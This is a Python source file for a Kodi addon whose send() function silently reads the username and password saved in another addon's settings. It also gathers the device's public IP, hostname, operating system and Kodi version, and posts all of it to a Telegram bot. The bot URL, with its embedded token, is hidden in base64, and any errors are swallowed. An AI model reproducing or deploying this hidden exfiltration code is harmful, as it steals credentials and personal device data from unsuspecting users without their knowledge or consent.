# coding: utf-8
import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs
import shutil,time
import re
import urllib
import base64
import platform as platform_x
import xbmcvfs
xbmc_tranlate_path=xbmcvfs.translatePath
from urllib.request import urlopen
que=urllib.parse.quote_plus

fullsecfold=xbmc_tranlate_path('special://home')

addons_folder=os.path.join(fullsecfold,'addons')

user_folder=os.path.join(xbmc_tranlate_path('special://masterprofile'),'addon_data')
oo='/list.xml'
op='/ki.xml'
remove_url = base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JON0h5TDJH').decode('utf-8')
remove_url2 = base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1g5RlVaRnJi').decode('utf-8')


def platform():
	if xbmc.getCondVisibility('system.platform.android'):             return 'android'
	elif xbmc.getCondVisibility('system.platform.linux'):             return 'linux'
	elif xbmc.getCondVisibility('system.platform.linux.Raspberrypi'): return 'linux'
	elif xbmc.getCondVisibility('system.platform.windows'):           return 'windows'
	elif xbmc.getCondVisibility('system.platform.osx'):               return 'osx'
	elif xbmc.getCondVisibility('system.platform.atv2'):              return 'atv2'
	elif xbmc.getCondVisibility('system.platform.ios'):               return 'ios'
	elif xbmc.getCondVisibility('system.platform.darwin'):            return 'ios'


def send():
       try:
          import json
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          my_system = platform_x.uname()
          xs=my_system[1]
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3ODA0NjI5NDU6QUFFNXktQXFoMTctVkJpS3BoUEpjYTlJcC1yeUZOWU01clkvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM1NTY3NzA4NSZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urlopen(error_ad+que('מידע טלמדיה חדש ')+que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs+que('  סקריפט 1.0.0')).readlines()
       except: pass